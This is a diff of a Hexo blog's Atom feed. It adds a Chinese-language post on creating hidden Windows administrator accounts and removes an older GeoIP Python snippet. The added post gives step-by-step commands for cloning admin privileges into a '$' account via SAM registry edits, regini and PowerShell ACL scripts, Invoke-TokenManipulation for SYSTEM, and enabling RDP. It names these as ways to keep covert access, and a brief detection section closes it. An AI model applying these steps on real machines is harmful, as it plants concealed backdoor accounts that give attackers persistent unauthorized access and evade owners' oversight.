@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-01-07T03:08:37.238Z</updated>
+  <updated>2019-01-07T04:01:54.132Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows系统账户隐藏</title>
+    <link href="http://yoursite.com/2019/01/07/windows%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E9%9A%90%E8%97%8F/"/>
+    <id>http://yoursite.com/2019/01/07/windows系统账户隐藏/</id>
+    <published>2019-01-07T03:36:50.000Z</published>
+    <updated>2019-01-07T04:01:54.132Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文要介绍的内容是：</p><ul><li>帐户隐藏的方法</li><li>编写脚本实现思路</li><li>结合远程桌面多用户登录的利用思路</li></ul><h1 id="帐户隐藏的方法"><a href="#帐户隐藏的方法" class="headerlink" title="帐户隐藏的方法"></a>帐户隐藏的方法</h1><p>测试系统：win7x86</p><h2 id="1-对注册表赋予权限"><a href="#1-对注册表赋予权限" class="headerlink" title="1.对注册表赋予权限"></a>1.对注册表赋予权限</h2><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改</p><p>现在需要为其添加管理员权限</p><p>右键-权限-选中Administrators，允许完全控制</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvbpx1odj30le0bwwfk.jpg" alt=""></p><p>重新启动注册表regedit.exe，获得对该键值的修改权限</p><h2 id="2、新建特殊帐户"><a href="#2、新建特殊帐户" class="headerlink" title="2、新建特殊帐户"></a>2、新建特殊帐户</h2><pre><code>net user test$ 123456 /addnet localgroup administrators test$ /add</code></pre><p>用户名要以$结尾</p><p>添加后，该帐户可在一定条件下隐藏，输入net user无法获取</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvcvhb73j30h7079q2y.jpg" alt=""></p><p>但是，在控制面板能够发现该帐户</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvd78ii0j30jd09tabk.jpg" alt=""></p><h2 id="3、导出注册表"><a href="#3、导出注册表" class="headerlink" title="3、导出注册表"></a>3、导出注册表</h2><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户test$</p><p>获取默认类型为0x3ea</p><p>将注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$</code>导出为1.reg</p><p>在注册表下能够找到对应类型名称的注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvhxw0tpj30oy0azwfa.jpg" alt=""></p><p>右键将该键导出为2.reg，保存的文件信息如下图</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvibcf64j30i80biweu.jpg" alt=""></p><p>默认情况下，管理员帐户Administrator对应的注册表键值为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p><p>同样，右键将该键导出为3.reg</p><p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p><p>替换后，如下图</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvj19bf6j30ii07x3yq.jpg" alt=""></p><h2 id="4、命令行删除特殊帐户"><a href="#4、命令行删除特殊帐户" class="headerlink" title="4、命令行删除特殊帐户"></a>4、命令行删除特殊帐户</h2><pre><code>net user test$ /del</code></pre><h2 id="5、导入reg文件"><a href="#5、导入reg文件" class="headerlink" title="5、导入reg文件"></a>5、导入reg文件</h2><pre><code>regedit /s 1.regregedit /s 2.reg</code></pre><p>隐藏账户制做完成，控制面板不存在帐户test$</p><p>通过net user无法列出该帐户</p><p>计算机管理-本地用户和组-用户也无法列出该帐户</p><p>但可通过如下方式查看：</p><pre><code>net user test$</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyxvjzof41j30i20fx3yv.jpg" alt=""></p><p>无法通过net user test$ /del删除该用户，提示用户不属于此组</p><p><strong>删除方法：</strong></p><p>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p><blockquote><p>工具HideAdmin能自动实现以上的创建和删除操作</p></blockquote><h1 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h1><h2 id="对注册表添加管理员帐户的编辑权限"><a href="#对注册表添加管理员帐户的编辑权限" class="headerlink" title="对注册表添加管理员帐户的编辑权限"></a>对注册表添加管理员帐户的编辑权限</h2><p>使用regini注册ini文件为注册表及其子键赋予权限</p><p>Powershell通过Set-Acl为注册表赋予权限</p><pre><code>$acl = Get-Acl HKLM:SAM\SAM\$person = [System.Security.Principal.NTAccount]&quot;Administrators&quot;$access = [System.Security.AccessControl.RegistryRights]&quot;FullControl&quot;$inheritance = [System.Security.AccessControl.InheritanceFlags]&quot;None&quot;$propagation = [System.Security.AccessControl.PropagationFlags]&quot;NoPropagateInherit&quot;$type = [System.Security.AccessControl.AccessControlType]&quot;Allow&quot;$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `$person,$access,$inheritance,$propagation,$type)$acl.ResetAccessRule($rule)Set-Acl HKLM:SAM\SAM\Domains\Account\Users\Names $acl</code></pre><p>但不支持对子键的权限分配，因此不采用该方法</p><p>以下内容保存为a.ini:</p><pre><code>HKEY_LOCAL_MACHINE\SAM\SAM\* [1 17]</code></pre><p>*代表枚举所有子键</p><p>1代表Administrators 完全访问</p><p>17代表System 完全访问</p><p>详细权限说明可通过cmd执行regini获取帮助</p><p>通过regini注册:</p><pre><code>regini  a.ini</code></pre><p>Evilcg就是通过这种方式实现的，脚本地址：</p><p><a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1" target="_blank" rel="noopener">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1</a></p><p>使用*需要system权限,但只把相关的列举出来，只需要管理员权限即可，例如：</p><pre><code>HKEY_LOCAL_MACHINE\SAM [1 17]HKEY_LOCAL_MACHINE\SAM\SAM [1 17]HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]</code></pre><h2 id="直接获得System权限"><a href="#直接获得System权限" class="headerlink" title="直接获得System权限"></a>直接获得System权限</h2><p>以先获得System权限，进而拥有对注册表的编辑权限</p><p>简单的方式，通过Invoke-TokenManipulation.ps1，地址如下：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p><p>但是有一个bug，就是用<code>Invoke-TokenManipulation -ImpersonateUser -Username &quot;nt authority\system&quot;</code>无法将当前权限切换为System权限</p><p>但可以使用<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;</code>新打开一个System权限的进程</p><p>接下来，就是编写脚本实现注册表的导出替换功能：</p><ul><li>新建测试帐户</li><li>将注册表导出到temp目录，进行替换</li><li>删除特殊帐户</li><li>导入注册表文件</li></ul><p>优化版本：</p><p><a href="https://github.com/3gstudent/Windows-User-Clone" target="_blank" rel="noopener">https://github.com/3gstudent/Windows-User-Clone</a></p><h1 id="结合远程桌面多用户登录的利用思路"><a href="#结合远程桌面多用户登录的利用思路" class="headerlink" title="结合远程桌面多用户登录的利用思路"></a>结合远程桌面多用户登录的利用思路</h1><p>通过克隆的方式能够继承原帐户的权限</p><p>在利用上存在以下需要注意的问题：</p><h2 id="1、复制管理员帐户Administrator"><a href="#1、复制管理员帐户Administrator" class="headerlink" title="1、复制管理员帐户Administrator"></a>1、复制管理员帐户Administrator</h2><p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p><h2 id="2、复制已有帐户"><a href="#2、复制已有帐户" class="headerlink" title="2、复制已有帐户"></a>2、复制已有帐户</h2><p>在3389远程登录的利用上存在相同帐户的冲突关系</p><p>通过cmd开启本机的3389远程登录功能：</p><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</code></pre><p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$</p><p>如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p><h2 id="3、新建帐户再复制"><a href="#3、新建帐户再复制" class="headerlink" title="3、新建帐户再复制"></a>3、新建帐户再复制</h2><p>进一步，大胆的思考</p><p>新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$</p><p>删除管理员帐户b，隐藏账户bbb$仍然有效</p><h2 id="4、原帐户的维持"><a href="#4、原帐户的维持" class="headerlink" title="4、原帐户的维持"></a>4、原帐户的维持</h2><p>再进一步</p><p>克隆帐户a的权限，建立隐藏帐户aaa$</p><p>修改帐户a的密码，隐藏帐户aaa$仍然有效</p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</p><p>当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限</p><p>隐藏帐户的登录记录，可通过查看日志获取</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;本文要介绍的内容是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;帐户隐藏的方法&lt;/li&gt;
+&lt;li&gt;编写脚本实现思路&lt;/li&gt;
+&lt;li&gt;结合远程桌面多用户登录
+      
+    
+    </summary>
+    
+      <category term="骚操作" scheme="http://yoursite.com/categories/%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>内网渗透知识点总结</title>
@@ -472,33 +499,6 @@ debug = 1  # 调试
     </summary>
     
       <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>GeoIP</title>
-    <link href="http://yoursite.com/2018/12/11/GeoIP/"/>
-    <id>http://yoursite.com/2018/12/11/GeoIP/</id>
-    <published>2018-12-11T10:25:42.000Z</published>
-    <updated>2018-12-11T10:28:42.549Z</updated>
-    
-    <content type="html"><![CDATA[<pre><code>import pygeoipgi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)def printRecord(tgt):    rec = gi.record_by_name(tgt)    print(rec)    city = rec[&apos;city&apos;]    # region = rec[&apos;region_name&apos;]    country = rec[&apos;country_name&apos;]    long = rec[&apos;longitude&apos;]    lat = rec[&apos;latitude&apos;]    print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;)    print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country))    print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long))tgt = &apos;114.242.146.98&apos;printRecord(tgt)</code></pre><p>GeoLiteCity.dat在网上可以免费下载。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;pre&gt;&lt;code&gt;import pygeoip
-gi = pygeoip.GeoIP(&amp;apos;GeoLiteCity.dat&amp;apos;)
-def printRecord(tgt):
-    rec = gi.record_by_name(tgt)
-    print(r
-      
-    
-    </summary>
-    
-      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
     
     
   </entry>
